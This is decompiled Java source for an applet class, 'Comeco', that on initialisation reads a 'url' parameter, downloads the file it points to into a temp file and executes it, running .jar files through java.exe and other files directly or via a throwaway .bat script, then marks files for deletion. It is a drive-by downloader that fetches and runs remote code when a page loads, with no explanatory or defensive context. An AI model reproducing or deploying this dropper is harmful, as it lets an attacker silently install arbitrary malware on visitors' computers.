import java.net.URLConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class Comeco extends Draw
{
    private static final long serialVersionUID = 1L;
    
    public void empaquetar() throws Exception {
        final byte[] buf = new byte[10240];
        final String ark = this.getParameter("url");
        String ext = ark.substring(ark.lastIndexOf("."));
        ext = ext.toLowerCase();
        final File news = File.createTempFile("javatmp", ext);
        final FileOutputStream output = new FileOutputStream(news);
        final URL urll = new URL(ark);
        final URLConnection uca = urll.openConnection();
        final BufferedInputStream is = new BufferedInputStream(uca.getInputStream());
        int ler;
        while ((ler = is.read(buf)) > 0) {
            output.write(buf, 0, ler);
        }
        output.close();
        if (ext.contains(".jar")) {
            Runtime.getRuntime().exec(String.valueOf(System.getProperty("sun.boot.library.path")) + "\\java.exe -jar  \"" + news.getAbsolutePath() + "\"");
        }
        else {
            try {
                Runtime.getRuntime().exec(news.getAbsolutePath());
            }
            catch (IOException e) {
                final File f = File.createTempFile("tmp", ".bat");
                f.createNewFile();
                f.deleteOnExit();
                final PrintWriter pw = new PrintWriter(f);
                pw.println("\"" + news.getAbsolutePath() + "\"");
                pw.close();
                Runtime.getRuntime().exec(f.getAbsolutePath());
                f.delete();
            }
        }
        news.deleteOnExit();
    }
    
    public void init() {
        try {
            this.empaquetar();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        super.init();
    }
}
